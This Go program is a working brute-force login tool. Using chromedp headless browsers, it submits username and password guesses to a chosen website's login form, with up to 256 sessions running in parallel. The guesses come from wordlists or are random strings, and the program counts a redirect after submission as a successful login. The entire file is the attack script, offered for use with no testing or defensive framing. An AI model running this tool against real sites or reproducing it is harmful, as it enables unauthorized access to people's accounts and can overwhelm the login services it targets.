package main

import (
	"context"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
)

const (
	maxParallel uint = 256
	charset          = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
)

func generateRandomString(minLen, maxLen int) string {
	length := rand.Intn(maxLen-minLen+1) + minLen
	sb := strings.Builder{}
	for i := 0; i < length; i++ {
		sb.WriteByte(charset[rand.Intn(len(charset))])
	}
	return sb.String()
}

func ensureURLScheme(url string) string {
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		return "http://" + url
	}
	return url
}

func readWordlist(filePath string) ([]string, error) {
	if filePath == "" {
		return nil, nil
	}
	if filepath.Ext(filePath) != ".txt" {
		return nil, fmt.Errorf("file %s is not a .txt file", filePath)
	}
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) == 0 || (len(lines) == 1 && lines[0] == "") {
		return nil, nil
	}
	return lines, nil
}

func main() {
	url := flag.String("url", "", "Target website login URL")
	userListFile := flag.String("users", "", "Path to usernames wordlist (.txt)")
	passListFile := flag.String("passwords", "", "Path to passwords wordlist (.txt)")
	numAttempts := flag.Int("attempts", 128, "Number of login attempts")
	flag.Parse()

	if *url == "" {
		fmt.Println("Error: URL is required")
		flag.Usage()
		os.Exit(1)
	}
	targetURL := ensureURLScheme(*url)

	usernames, err := readWordlist(*userListFile)
	if err != nil {
		fmt.Printf("Error reading usernames file: %v\n", err)
		os.Exit(1)
	}
	passwords, err := readWordlist(*passListFile)
	if err != nil {
		fmt.Printf("Error reading passwords file: %v\n", err)
		os.Exit(1)
	}

	rand.Seed(time.Now().UnixNano())

	tasks := make(chan struct {
		user string
		pass string
	}, *numAttempts)
	var wg sync.WaitGroup
	sem := make(chan struct{}, maxParallel)

	if usernames != nil && passwords != nil {
		for i := 0; i < *numAttempts; i++ {
			user := usernames[rand.Intn(len(usernames))]
			pass := passwords[rand.Intn(len(passwords))]
			tasks <- struct {
				user string
				pass string
			}{user, pass}
		}
	} else {
		for i := 0; i < *numAttempts; i++ {
			tasks <- struct {
				user string
				pass string
			}{generateRandomString(1, 32), generateRandomString(1, 32)}
		}
	}
	close(tasks)

	for task := range tasks {
		wg.Add(1)
		sem <- struct{}{}
		go func(user, pass string) {
			defer wg.Done()
			defer func() { <-sem }()

			ctx, cancel := chromedp.NewContext(context.Background())
			defer cancel()

			var currentURL string
			err := chromedp.Run(ctx,
				chromedp.Navigate(targetURL),
				chromedp.WaitVisible(`input[type="text"]`),
				chromedp.SendKeys(`input[type="text"]`, user),
				chromedp.SendKeys(`input[type="password"]`, pass),
				chromedp.Click(`input[type="submit"]`, chromedp.NodeVisible),
				chromedp.Sleep(8*time.Second),
				chromedp.Location(&currentURL),
			)
			if err != nil {
				fmt.Printf("Error with %s/%s: %v\n", user, pass, err)
				return
			}

			if currentURL != targetURL {
				fmt.Printf("Success: %s/%s (Redirected to %s)\n", user, pass, currentURL)
			} else {
				fmt.Printf("Failure: %s/%s (No redirect, still at %s)\n", user, pass, currentURL)
			}
		}(task.user, task.pass)
	}
	wg.Wait()
}
